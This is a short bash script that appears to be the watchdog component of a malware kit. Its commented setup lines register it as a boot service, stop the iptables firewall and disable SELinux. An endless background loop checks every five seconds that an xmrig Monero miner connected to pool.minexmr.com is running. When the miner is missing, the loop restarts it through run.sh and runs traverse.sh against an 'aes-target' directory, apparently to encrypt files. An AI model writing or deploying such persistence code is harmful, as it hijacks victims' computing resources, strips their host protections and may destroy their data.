#!/bin/bash
# chkconfig --add networkstart 
# chkconfig networkstart on
# service stop iptables   
# setenforce 0
function CheckProcess()
{
# Check whether the parameter is present
        if [ "$1" = "" ];then
            return 1
        fi

# $PROCESS_NUM is the number of $1
        PROCESS_NUM=`ps -ef | grep "$1" | grep -v "grep" | wc -l`
        if [ $PROCESS_NUM != 0 ];then
            return 1
        else
            return 0
        fi
}


num=0
while [ 1 ] ; do
    CheckProcess "xmrig -o pool.minexmr.com:443"
    if [ $? == 0 ];then
        # restart & aes 
        chmod 764 traverse.sh
        ./traverse.sh ./aes-target 
        chmod 764 run.sh
        nohup ./run.sh  >/dev/null 2>&1 &   
    #add other process...
    fi
sleep 5
done &


